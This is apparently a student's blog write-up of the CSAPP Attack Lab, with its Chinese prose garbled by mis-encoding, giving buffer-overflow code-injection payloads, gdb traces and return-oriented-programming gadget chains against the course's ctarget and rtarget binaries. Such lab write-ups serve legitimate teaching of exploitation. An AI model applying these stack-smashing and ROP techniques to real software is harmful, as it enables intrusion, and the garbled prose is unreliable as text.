---
layout: posts
title: CSAPP Attack Lab
date: 2022-12-16 22:13:20
categories: ç¼–ç¨‹
tags:
  - C
  - Assembly
  - è®¡ç®—æœºä½“ç³»ç»“æ„
---

è¿™ä¸ª lab å¯¹åº”çš„æ˜¯ CSAPP ä¸­çš„ 3.10 èŠ‚ï¼Œä¸»è¦æ˜¯ç¼“å†²åŒºæ”»å‡»ï¼Œéœ€è¦å¯¹æ ˆå¸§ç»“æ„ã€gdb æœ‰ä¸€å®šäº†è§£ã€‚ç°åœ¨å¼€æï¼

<!--more-->

## å‰ç½®

é¦–å…ˆæœ‰ä¸ªå‡½æ•°`getbuf()`ï¼Œè¿™ä¸ªæ˜¯ç¼“å†²åŒºæ”»å‡»çš„é‡ç‚¹ã€‚

```c
unsigned getbuf() {
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}
```

å¯ä»¥çœ‹åˆ°æœ‰ä¸ªæ ˆä¸Šçš„æ•°ç»„`buf[BUFFER_SIZE]`ï¼Œè¿˜æœ‰ä¸€ä¸ª`Gets()`ï¼Œä½œç”¨ç›¸å½“äºè‘—åçš„`gets()`ã€‚ç”±äº`Gets()`ä¸æ‰§è¡Œç¼“å†²åŒºæ£€æŸ¥ï¼Œæˆ‘ä»¬èƒ½å¤Ÿå€ŸåŠ©å¯¹`buf`çš„è¯»å…¥è¦†ç›–æ ˆä¸Šå…¶ä»–éƒ¨åˆ†(æ¯”å¦‚è¿”å›åœ°å€)ï¼Œåšå‡ºä¸€äº›èŠ±æ´»ï¼Œè¿™å°±æ˜¯ç¼“å†²åŒºæ”»å‡»çš„åŸç†ã€‚

åœ¨è¿™ä¸ª lab ä¸­ï¼Œæˆ‘ä»¬éœ€è¦ç”¨ä¸åŒæ–¹æ³•å‘èµ·ç¼“å†²åŒºæ”»å‡»ï¼Œä»¥æ°å½“çš„å‚æ•°è°ƒç”¨ä¸‰ä¸ªå‡½æ•°ï¼š`touch1()`ã€`touch2()`ã€`touch3()`ã€‚è¿™ä¸ª lab å¤§ä½“æä¾›äº†ä¸¤ç§æ–¹å¼ï¼šä»£ç æ³¨å…¥ã€é¢å‘ return ç¼–ç¨‹(ROP)ã€‚ä¸‹æ–‡ä¼šç»† ğŸ”’ã€‚

åœ¨å¼€æä¹‹å‰ï¼Œå›é¡¾ä¸€ä¸‹æ ˆå¸§ç»“æ„ï¼š
![](/2022/12/16/CSAPP-Attack-Lab/image/stack_frame.png)

åœ¨è¿”å›æ—¶ï¼Œ%rsp æŒ‡å‘è¿”å›åœ°å€ï¼Œç„¶åå°†å…¶å¼¹å‡ºï¼Œå¹¶å°†ç¨‹åºè®¡æ•°å™¨ PC è®¾ç½®æˆè¿™ä¸ªè¿”å›åœ°å€ã€‚æˆ‘ä»¬ä¸»è¦åœ¨è¿™é‡Œåšæ–‡ç« ã€‚

å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œæ¯ä¸€ä»½ä½œä¸šéƒ½ç»™äº†ä¸€ä¸ªç‹¬ä¸€æ— äºŒçš„ cookieï¼Œåé¢ä¼šç”¨åˆ°ã€‚(æˆ‘çš„æ˜¯`0x59b997fa`)

## ç¬¬ä¸€éƒ¨åˆ† ä»£ç æ³¨å…¥

è¿™ä¸ªæ˜¯æœ¬ lab ç¬¬ä¸€éƒ¨åˆ†çš„ä»»åŠ¡ã€‚åœ¨è¿™ä¸€éƒ¨åˆ†é‡Œï¼Œæ ˆåœ°å€æ²¡æœ‰éšæœºåŒ–ï¼Œå¯¹äºæ”»å‡»æ¥è¯´åˆšåˆšå¥½ã€‚è¿™ä¸€éƒ¨åˆ†å¯¹åº”çš„äºŒè¿›åˆ¶ç¨‹åºæ˜¯`./ctarget`ã€‚

é¦–å…ˆæœ‰ä¸ªå‡½æ•°`test()`ä½œä¸ºå…¥å£ï¼š

```c
void test() {
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val); // normal result
}
```

æ­£å¸¸æƒ…å†µä¸‹ï¼Œå‡½æ•°ä¼šæ‰§è¡Œåˆ°é‚£è¡Œ`printf`ï¼Œè€Œæˆ‘ä»¬çš„ä»»åŠ¡æ˜¯ä¸è®©å®ƒèµ°è¿™æ¡è·¯ï¼Œè€Œæ˜¯æ‰§è¡Œåˆ«çš„å‡½æ•°ã€‚

### 1. touch1()

æˆ‘ä»¬è¦æ‰§è¡Œçš„å‡½æ•°å¦‚ä¸‹ï¼š

```c
void touch1() {
    // ...
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

åªè¦è§¦å‘å°±ç®—èµ¢ï¼æˆ‘ä»¬ç›´æ¥çœ‹`touch1()`çš„æ±‡ç¼–ï¼š

```asm
00000000004017c0 <touch1>:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
  ...
```

å¯ä»¥çœ‹åˆ°`touch1()`çš„åœ°å€æ˜¯`0x4017c0`ã€‚

æ¥ä¸‹æ¥è¦å†³å®šè¿™ä¸ªåœ°å€æ”¾åœ¨å“ªé‡Œï¼Œæ‰€ä»¥æˆ‘ä»¬çœ‹ä¸€ä¸‹`getbuf()`çš„æ±‡ç¼–ï¼Œçœ‹çœ‹å®ƒæ ˆç©ºé—´å¼€äº†å¤šå¤§ï¼š

```asm
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

å¼€äº† 40 å­—èŠ‚ã€‚å› æ­¤ï¼Œæˆ‘ä»¬æŠŠåœ°å€æ”¾åˆ° 40~48 å­—èŠ‚å¤„ï¼Œå¦‚ä¸‹ï¼š

```
64 64 64 64 64 64 64 64 # useless bytes(5 * 8)
64 64 64 64 64 64 64 64
64 64 64 64 64 64 64 64
64 64 64 64 64 64 64 64
65 65 65 65 65 65 65 65

c0 17 40 00 00 00 00 00 # address
```

ä¸ºäº†æŸ¥çœ‹æ•ˆæœï¼Œæˆ‘ä»¬å¼€ä¸€ä¸‹ gdb:

```
(gdb) b * 0x4017a8
Breakpoint 1 at 0x4017a8: file buf.c, line 12.
(gdb) b * 0x4017b9
Breakpoint 2 at 0x4017b9: file buf.c, line 16.
(gdb) run -q < <(./hex2raw < exploit_c1.txt)
Starting program: /home/asterich/code/labs/csapp/3-attack/ctarget -q < <(./hex2raw < exploit_c1.txt)
Cookie: 0x59b997fa

Breakpoint 1, getbuf () at buf.c:12
12      buf.c: No such file or directory.
(gdb) continue
Continuing.

Breakpoint 2, 0x00000000004017b9 in getbuf () at buf.c:16
16      in buf.c
(gdb) print /x $rsp
$1 = 0x5561dc78
(gdb) x/6g 0x5561dc78
0x5561dc78:     0x6464646464646464      0x6464646464646464
0x5561dc88:     0x6464646464646464      0x6464646464646464
0x5561dc98:     0x6565656565656565      0x00000000004017c0
```

å¯ä»¥çœ‹åˆ°ï¼Œåœ°å€`(%rsp + 0x28)`å¤„å˜æˆäº†æˆ‘ä»¬çš„å½¢çŠ¶ã€‚æ¥ä¸‹æ¥ç»§ç»­æ‰§è¡Œï¼š

```
(gdb) stepi
0x00000000004017bd      16      in buf.c
(gdb) print /x *(long long *) ($rsp)
$7 = 0x4017c0
```

`ret`ä¹‹åï¼Œ%rsp æ¥åˆ°äº†æˆ‘ä»¬æƒ³è¦çš„åœ°æ–¹ã€‚ç»§ç»­æ‰§è¡Œï¼š

```
(gdb) stepi
touch1 () at visible.c:25
```

èµ¢ï¼

### 2. touch2()

`touch2()`æœ‰äº›ä¸ä¸€æ ·ï¼Œå®ƒå¯¹å‚æ•°æœ‰äº›è¦æ±‚ï¼š

```c
void touch2(unsigned val) {
    // ...
    if (val == cookie) {
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

è¿™è¦æ±‚æˆ‘ä»¬æ³¨å…¥ä¸€äº›ä»£ç ï¼ŒæŠŠæˆ‘ä»¬æ‹¿åˆ°çš„ cookie èµ‹ç»™å‚æ•° val(å³å¯„å­˜å™¨%rdi)ã€‚æœ‰ä¸€æ¡ mov æŒ‡ä»¤æ˜¯è‚¯å®šçš„ï¼Œå…³é”®åœ¨äºæ€ä¹ˆå…ˆè·³åˆ°æ³¨å…¥ä»£ç å†è·³åˆ°`touch2()`ã€‚è¿™é‡Œçš„æ­£å¸¸åšæ³•åº”è¯¥æ˜¯ mov å®Œäº†ä¹‹åæŠŠ`touch2()`çš„åœ°å€å…¥æ ˆï¼Œå¦‚ä¸‹(è½¬è‡ª[https://zhuanlan.zhihu.com/p/60724948]())ï¼š

```
48 c7 c7 <cookie>         # mov    <cookie>,%rdi
68 ec 17 40 00            # pushq  $0x4017ec
c3                        # retq

...

78 dc 61 55 00 00 00 00   # æ³¨å…¥ä»£ç çš„åœ°å€
```

ç„¶è€Œæˆ‘çš„åšæ³•æ¯”è¾ƒé€†å¤©ï¼š

```
bf 97 dc 61 55            # mov $0x5561dc97, %edi
48 83 ec 30               # sub $0x20, %rsp
c3                        # retq
90 90 90 90 90 90

ec 17 40 00 00 00 00 00   # touch2()

...

78 dc 61 55 00 00 00 00   # æ³¨å…¥ä»£ç çš„åœ°å€
```

å¤§æ¦‚å°±æ˜¯ç›´æ¥æ“æ§%rspï¼Œè®©å®ƒç›´æ¥æŒ‡å‘`touch2()`ã€‚

æŠŠ gdb è´´å‡ºæ¥(åœ°å€`0x5561dc7d`å¯¹åº”çš„æ˜¯`sub $0x20, %rsp`)ï¼š

```
Breakpoint 1, getbuf () at buf.c:12
12      in buf.c
(gdb) continue
Continuing.

Breakpoint 2, 0x00000000004017b9 in getbuf () at buf.c:16
16      in buf.c
(gdb) x/6g $rsp
0x5561dc78:     0xec834859b997fabf      0x909090909090c320
0x5561dc88:     0x00000000004017ec      0x6464646464646464
0x5561dc98:     0x6565656565656565      0x000000005561dc78
(gdb) stepi
0x00000000004017bd      16      in buf.c
(gdb) stepi
0x000000005561dc78 in ?? ()
(gdb) x/6g $rsp
0x5561dca8:     0x0000000000000000      0x0000000000401f24
0x5561dcb8:     0x0000000000000000      0xf4f4f4f4f4f4f4f4
0x5561dcc8:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
(gdb) stepi
0x000000005561dc7d in ?? ()
(gdb) x/6g $rsp
0x5561dca8:     0x0000000000000000      0x0000000000401f24
0x5561dcb8:     0x0000000000000000      0xf4f4f4f4f4f4f4f4
0x5561dcc8:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
(gdb) stepi
0x000000005561dc81 in ?? ()
(gdb) x/6g $rsp
0x5561dc88:     0x00000000004017ec      0x6464646464646464
0x5561dc98:     0x6565656565656565      0x000000005561dc78
0x5561dca8:     0x0000000000000000      0x0000000000401f24
(gdb) print /x ($edi)
$9 = 0x59b997fa
(gdb) stepi
touch2 (val=1505335290) at visible.c:40
40      visible.c: No such file or directory.
```

ä¹Ÿè¡Œã€‚

æœ€ç»ˆç­”æ¡ˆï¼š

```
bf fa 97 b9 59 48 83 ec 20 c3 90 90 90 90 90 90 ec 17 40 00 00 00 00 00
64 64 64 64 64 64 64 64 65 65 65 65 65 65 65 65 78 dc 61 55 00 00 00 00
```

### 3. touch3()

çœ‹çœ‹`touch3()`ï¼š

```c
void touch3(char *sval) {
    if (hexmatch(cookie, sval)) {
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}
```

`touch3()`çš„å‚æ•°æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚åœ¨`touch3()`ä¸­ï¼Œå‚æ•°çš„å­—ç¬¦ä¸²ä¼šå’Œ cookie è½¬åŒ–æˆçš„å­—ç¬¦ä¸²ç”¨`hexmatch()`æ¯”è¾ƒï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å¼€ä¸¤å—åœ°æ–¹ï¼Œä¸€ä¸ªå­˜æ”¾ cookie å­—ç¬¦ä¸²æœ¬èº«ï¼Œä¸€ä¸ªå­˜æ”¾å­—ç¬¦ä¸²çš„åœ°å€ã€‚

æˆ‘ä»¬å†çœ‹çœ‹`hexmatch()`ï¼š

```c
int hexmatch(unsigned val, char *sval) {
    char cbuf[110];
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}
```

æ˜¾ç„¶ï¼Œå®ƒå¯èƒ½ä¼šè¦†ç›–åŸå…ˆ`getbuf()`ç¼“å†²åŒºçš„æ•°æ®ï¼Œæ‰€ä»¥æŠŠå®ƒæ”¾åœ¨å“ªé‡Œä¹Ÿæ˜¯éœ€è¦è€ƒè™‘çš„åœ°æ–¹ã€‚æœ€å®‰å…¨çš„åšæ³•åº”è¯¥æ˜¯æ”¾åœ¨åŸå…ˆçš„è¿”å›åœ°å€åé¢ã€‚å…¶ä»–çš„åŒ`touch2()`ã€‚

æœ€ç»ˆç­”æ¡ˆï¼š

```
bf a8 dc 61 55 48 83 ec 20 c3 90 90 90 90 90 90 fa 18 40 00 00 00 00 00
64 64 64 64 64 64 64 35 39 62 39 39 37 66 61 00 78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61 00
```

## ç¬¬äºŒéƒ¨åˆ† Return-Oriented Programming

ä¸ºäº†é˜²æ­¢ç›´çƒä»£ç æ³¨å…¥ï¼Œäººä»¬å‘æ˜å‡ºäº†ä¸€äº›è§£å†³æ–¹æ³•ï¼Œä¾‹å¦‚ä»¥ä¸‹ä¸¤ç§ï¼š

- éšæœºåŒ–ï¼šå‡½æ•°çš„æ ˆå¸§åœ°å€éšæœºåˆ†é…ï¼Œæ¯æ¬¡è¿è¡Œéƒ½ä¸ä¸€æ ·
- æ ˆå¸§è¢«æ ‡è®°ä¸ºä¸å¯æ‰§è¡Œçš„

ä¸å¹¸çš„æ˜¯ï¼Œæˆ‘ä»¬çš„æ–°ç¨‹åº`./rtarget`è¿ç”¨äº†è¿™äº›æŠ€æœ¯ã€‚

é“é«˜ä¸€å°ºé­”é«˜ä¸€ä¸ˆï¼ŒROP åº”è¿è€Œç”Ÿã€‚

ROP è¿™ç§å«æ³•å¾ˆæœ‰è¶£ï¼Œå¤§æ¦‚æ˜¯åœ¨æ ˆä¸­è¿ç»­æ”¾å…¥ä¸€äº›å·¥å…·(gadget)çš„åœ°å€ï¼Œè¿™æ ·å°±èƒ½é€šè¿‡`ret`æŒ‡ä»¤ä¸€è·¯è·³ä¸‹å»ã€‚ç»™ä¸ªç”ŸåŠ¨å½¢è±¡çš„å›¾ï¼š

![](/2022/12/16/CSAPP-Attack-Lab/image/rop.png)

gadget ä¸€èˆ¬æºäºäºŒè¿›åˆ¶ç¨‹åºä¸­å·²æœ‰çš„ç‰‡æ®µæˆ–è€…å…¶é“¾æ¥çš„åº“ã€‚

ä¸¾ä¸ªä¾‹å­ï¼Œçœ‹çœ‹ lab ä¸­`farm.c`çš„ä¸€ä¸ªå‡½æ•°ï¼š

```c
void setval_210(unsigned *p) {
    *p = 3347663060U;
}
```

æœºå™¨ç ï¼š

```
400f15:    c7 07 d4 48 89 c7     # movl $0xc78948d4,(%rdi)
400f1b:    c3                    # retq
```

æ³¨æ„åˆ°é‡Œé¢æœ‰ä¸ªåºåˆ—`48 89 c7`ï¼Œè§£ç ååˆšå¥½æ˜¯æ±‡ç¼–`movq %rax, %rdi`ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬æ‰¾åˆ°äº†ä¸€ä¸ªèµ·å§‹åœ°å€ä¸º`0x400f18`ã€æŒ‡ä»¤ä¸º`movq %rax, %rdi`çš„ gadgetã€‚

åœ¨æ¥ä¸‹æ¥çš„ä»»åŠ¡ä¸­ï¼Œæˆ‘ä»¬è¦ä»`farm.c`ä¸­æ‰¾ gadgetï¼Œå¹¶ä¸”æ”¾åˆ°æ ˆä¸­é€‚å½“ä½ç½®ã€‚

### 1. touch2()

è¿™é‡ŒåŒæ ·è¦æ±‚æˆ‘ä»¬è§¦å‘`touch2()`å¹¶ä¸”ä¼ å…¥æ­£ç¡®çš„å‚æ•°ã€‚æˆ‘ä»¬å¯¹ç…§ lab ä»»åŠ¡ä¹¦çš„æŒ‡ä»¤ç¼–ç è¡¨æ ¼ï¼Œåœ¨åæ±‡ç¼–å`farm.c`çš„å‰åŠéƒ¨åˆ†ä¸­æŸ¥æ‰¾å¯èƒ½æœ‰ç”¨çš„ gadget(å·²ç»ç”¨æ³¨é‡Šæ ‡å‡ºæ¥)ï¼š

```asm
000000000040199a <getval_142>:
  40199a:	b8 fb 78 90 90       	mov    $0x909078fb,%eax
  40199f:	c3                   	retq

; mov %rax, %rdi
; ret
00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq

; popq %rax
00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq

00000000004019ae <setval_237>:
  4019ae:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)
  4019b4:	c3                   	retq

00000000004019b5 <setval_424>:
  4019b5:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)
  4019bb:	c3                   	retq

00000000004019bc <setval_470>:
  4019bc:	c7 07 63 48 8d c7    	movl   $0xc78d4863,(%rdi)
  4019c2:	c3                   	retq

; mov %rax, %rdi
; nop
00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq

; popq %rax
; nop
; ret (near)
00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	retq

```

æˆ‘ä»¬æ‰¾åˆ°`popq %rax`(`0x4019ab`)å’Œ`mov %rax, %rdi`(`0x4019a2`)è¿™ç§ç›¸å½“æœ‰ç”¨çš„æŒ‡ä»¤ï¼Œå› æ­¤æŠŠæ ˆåšå¦‚ä¸‹ç¼–æ’ï¼š

```
...                           # 40 useless bytes
ab 19 40 00 00 00 00 00       # popq %rax
fa 97 b9 59 00 00 00 00       # cookie
a2 19 40 00 00 00 00 00       # mov %rax, %rdi
ec 17 40 00 00 00 00 00       # touch2()
```

### 2. touch3()

æœ€åˆæ‰“ç®—ç›´æ¥ä½¿ç”¨%rsp æ¥å……å½“å­—ç¬¦ä¸²çš„åœ°å€ï¼Œä½†æ˜¯è¿™æ ·çš„è¯å®åœ¨æ²¡æœ‰åˆé€‚çš„æŒ‡ä»¤è®©%rsp å¾€ä¸‹è·³â€¦â€¦çœ‹äº†äº¿çœ¼åˆ«äººçš„ç­”æ¡ˆï¼Œæ‰å‘ç°å¯ä»¥è®©%rsp åŠ ä¸Šä¸€ä¸ªåç§»é‡ï¼Œå¯„å¯„å¯„ï¼ˆ

åç§»é‡æ€ä¹ˆåŠ å‘¢ï¼Ÿæˆ‘ä»¬çœ‹çœ‹`farm.c`(åªæˆªå–æœ‰ç”¨çš„ gadget)ï¼š

```asm
; mov %rax, %rdi
; nop
00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq

; performs "%rax = %rdi + %rsi"
00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	retq

; mov %rsp, %rax
0000000000401a03 <addval_190>:
  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
  401a09:	c3                   	retq

; mov %ecx, %esi
0000000000401a11 <addval_436>:
  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
  401a17:	c3                   	retq

; mov %ecx, %esi
0000000000401a25 <addval_187>:
  401a25:	8d 87 89 ce 38 c0    	lea    -0x3fc73177(%rdi),%eax
  401a2b:	c3                   	retq

; mov %edx, %ecx
0000000000401a33 <getval_159>:
  401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax
  401a38:	c3                   	retq

; mov %esp, %eax
0000000000401a39 <addval_110>:
  401a39:	8d 87 c8 89 e0 c3    	lea    -0x3c1f7638(%rdi),%eax
  401a3f:	c3                   	retq

; mov %eax, %edx
; testb
0000000000401a40 <addval_487>:
  401a40:	8d 87 89 c2 84 c0    	lea    -0x3f7b3d77(%rdi),%eax
  401a46:	c3                   	retq

; mov %edx, %ecx
; orb %bl
0000000000401a68 <getval_311>:
  401a68:	b8 89 d1 08 db       	mov    $0xdb08d189,%eax
  401a6d:	c3                   	retq

; mov %rsp, %rax
; but it can't be used
0000000000401a97 <setval_181>:
  401a97:	c7 07 48 89 e0 c2    	movl   $0xc2e08948,(%rdi)
  401a9d:	c3                   	retq

; mov %rsp, %rax
0000000000401aab <setval_350>:
  401aab:	c7 07 48 89 e0 90    	movl   $0x90e08948,(%rdi)
  401ab1:	c3                   	retq

```

æˆ‘ä»¬å‘ç°æœ‰ä¸€ä¸ªç‰¹åˆ«çš„å‡½æ•°`add_xy()`å¯ä»¥ç›´æ¥æŠŠ`%rdi`å’Œ`%rsi`ç›¸åŠ ï¼Œæ”¾åˆ°`%rax`ä¸Šï¼›æˆ‘ä»¬è¿˜å‘ç°æœ‰å‡ ä¸ªå¯„å­˜å™¨å¯ä¾›æˆ‘ä»¬å€’è…¾ï¼š`%ecx`ã€`%edx`ã€`%rsi`ã€`%rdi`ã€`%rax`ã€‚

æˆ‘ä»¬å…ˆå†™å‡ºä¸€ä¸ªéª¨æ¶ï¼š

```asm
; calculate offset
...
; after that, the offset is put in %rax

; put offset into %rsi
mov %eax, %edx
mov %edx, %ecx
mov %ecx, %esi

; main
mov %rsp, %rax
mov %rax, %rdi
add_xy()
mov %rax, %rdi
call touch3()
<cookie string>

```

åœ¨è¿™é‡Œï¼Œåç§»é‡æ˜¾ç„¶æ˜¯`mov %rsp, %rax`å’Œ`<cookie string>`çš„è·ç¦»ï¼Œä½†æ˜¯ä¸­é—´å…¶å®è¿˜å¯ä»¥å¡«å……ä¸€äº›ç›¸å½“äº`nop`çš„ä¸œè¥¿ã€‚æˆ‘ä»¬è¿˜å‘ç°ï¼Œ`getbuf()`çš„è¿”å›å€¼æ˜¯ 1ï¼Œè¿™è¡¨æ˜`%rax`åœ¨æ”»å‡»å¼€å§‹æ—¶ä¸€å®šæ˜¯ 1ã€‚

æˆ‘çš„åšæ³•è¿˜æ˜¯æ¯”è¾ƒé€†å¤©ï¼šä¸æ–­å€å¢è¿™ä¸ª 1ã€‚ç»“æœç›¸å½“é•¿ã€‚

å€å¢æ˜¯è¿™æ ·çš„(`%rax -> %rdx -> %rcx -> %rsi, %rax -> %rdi, add_xy()`)ï¼š

```asm
mov %eax, %edx
mov %edx, %ecx
mov %ecx, %esi
mov %rax, %rdi
add_xy()
```

å¦‚æœæ˜¯å€å¢ï¼Œæœ€åçš„åç§»é‡éœ€è¦æ˜¯$2^n$ï¼Œå¯èƒ½éœ€è¦å¡«å……ä¸€äº›ç›¸å½“äº`nop`çš„æŒ‡ä»¤ã€‚ä¸è¿‡è¿™é‡Œä¸éœ€è¦ã€‚

æœ€ç»ˆç»“æœï¼š

```
# useless bytes (40 bytes)
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
64 64 64 64 64 64 64 64
65 65 65 65 65 65 65 65

# double(x5)
42 1a 40 00 00 00 00 00  # mov %eax, %edx
34 1a 40 00 00 00 00 00  # mov %edx, %ecx
27 1a 40 00 00 00 00 00  # mov %ecx, %esi
c5 19 40 00 00 00 00 00  # mov %rax, %rdi
d6 19 40 00 00 00 00 00  # add_xy()

42 1a 40 00 00 00 00 00
34 1a 40 00 00 00 00 00
27 1a 40 00 00 00 00 00
c5 19 40 00 00 00 00 00
d6 19 40 00 00 00 00 00

42 1a 40 00 00 00 00 00
34 1a 40 00 00 00 00 00
27 1a 40 00 00 00 00 00
c5 19 40 00 00 00 00 00
d6 19 40 00 00 00 00 00

42 1a 40 00 00 00 00 00
34 1a 40 00 00 00 00 00
27 1a 40 00 00 00 00 00
c5 19 40 00 00 00 00 00
d6 19 40 00 00 00 00 00

42 1a 40 00 00 00 00 00
34 1a 40 00 00 00 00 00
27 1a 40 00 00 00 00 00
c5 19 40 00 00 00 00 00
d6 19 40 00 00 00 00 00

# main
42 1a 40 00 00 00 00 00  # mov %eax, %edx
34 1a 40 00 00 00 00 00  # mov %edx, %ecx
27 1a 40 00 00 00 00 00  # mov %ecx, %esi
ad 1a 40 00 00 00 00 00  # mov %rsp, %rax
c5 19 40 00 00 00 00 00  # mov %rax, %rdi
d6 19 40 00 00 00 00 00  # add_xy()
c5 19 40 00 00 00 00 00  # mov %rax, %rdi
fa 18 40 00 00 00 00 00  # call touch3()
35 39 62 39 39 37 66 61  # <cookie string>
00 00 00 00 00 00 00 00
```

## æ€»ç»“

å¤ªå¥½ç©è¾£ï¼

![](/2022/12/16/CSAPP-Attack-Lab/image/%E5%B1%80%E5%BA%A7.jpg)
